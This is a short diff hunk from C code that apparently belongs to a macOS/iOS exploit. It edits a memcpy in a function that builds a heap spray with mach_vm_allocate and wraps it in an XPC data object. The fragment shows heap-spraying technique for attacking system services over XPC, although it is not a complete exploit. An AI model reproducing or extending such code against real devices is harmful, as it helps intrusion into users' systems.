@@ -754,7 +754,7 @@ add_heap_spray_to_dictionary(
   err = mach_vm_allocate(mach_task_self(), &full_heapspray, full_heapspray_size, 1);
   
   for (size_t i = 0; i < n_heapspray_pages; i++) {
-    memcpy((void*)(full_heapspray + (i*heapspray_page_size)), heapspray_contents, heapspray_page_size);
+    memcpy((void*)(full_heapspray + (i*heapspray_page_size)), &heapspray_contents, heapspray_page_size);
   }
   
   // wrap that in an xpc data object
